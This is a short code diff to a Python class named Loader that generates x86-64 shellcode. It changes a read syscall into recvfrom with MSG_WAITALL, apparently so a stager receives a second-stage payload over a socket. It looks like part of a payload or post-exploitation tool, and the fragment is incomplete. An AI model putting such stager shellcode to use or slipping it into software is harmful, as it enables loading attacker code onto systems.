@@ -166,13 +166,16 @@ class Loader(object):
             """)
 
         payload += dedent(f"""\
-                xor rax, rax
+                push 0x2d
+                pop rax
                 push r13
                 pop rdi
                 push r15
                 pop rsi
                 push r12
                 pop rdx
+                push 0x100
+                pop r10
                 syscall
 
                 push 0x1
